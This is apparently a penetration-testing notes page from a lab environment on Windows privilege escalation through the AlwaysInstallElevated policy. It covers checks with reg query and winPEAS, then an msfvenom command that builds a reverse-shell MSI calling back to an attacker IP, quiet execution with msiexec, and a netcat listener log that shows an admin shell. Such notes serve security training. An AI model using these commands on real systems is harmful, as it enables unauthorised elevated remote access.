
# AlwaysInstallElevated
MSI files are files used *to install applications*. They always fun with the permissions of the user who is installing them. Windows allows these applications to be run *w/ elevated/ admin privileges*. If the target system does this, then we can abuse this by generating a malicious MSI file that does what we want (like establish a revshell for instance).
## Enumeration
There are two settings in the [registry](../../../computers/windows/registry.md) which *must be enabled* for this to work. The value for **AlwaysInstallElevated** must have be set to `1` for both the local machine and the current user.
1. local machine: `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
2. current user: `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
If either is missing or disabled, *this exploit won't work*.
### Checking manually
You can check to see if these conditions are met by using the `reg query` command and giving it the two keys with the `/v AlwaysInstallElevated` flag:
```powershell
PS C:\Users\admin> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```
### Checking with winPEAS
You can use the `windowscreds` module with [winPEAS](../../../cybersecurity/TTPs/actions-on-objective/tools/winPEAS.md) to check if the two values are enabled. Check under the section of the output labeled "Checking AlwaysInstallElevated"
```powershell
.\winPEASany.exe quiet windowscreds

...

  [+] Checking AlwaysInstallElevated(T1012)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!

...
```
## Exploitation
Once we know the two keys have values of 1, then we can create a malicious MSI file using `msfvenom`. Set the `-f` flag to `msi`:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.69.4 LPORT=44444 -f msi -o reverse.msi
```
### Execute using `msiexec`
Once the revshell binary is on the target machine, use `msiexec` to execute it from the terminal. Make sure to use the `/quiet` flag:
```powershell
msiexec /quiet /qn /i reverse.msi
```
Listener:
```bash
┌─[25-07-28 21:12:29]:(root@10.0.2.15)-[~/tibs]
└─# nc -lvp 44444
listening on [any] 44444 ...
10.0.69.5: inverse host lookup failed: Host name lookup failure
connect to [10.0.69.4] from (UNKNOWN) [10.0.69.5] 62167
Microsoft Windows [Version 10.0.19045.6093]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
windows-10-oscp\admin

C:\Windows\system32>
```
In this case, the revshell executed as the admin user.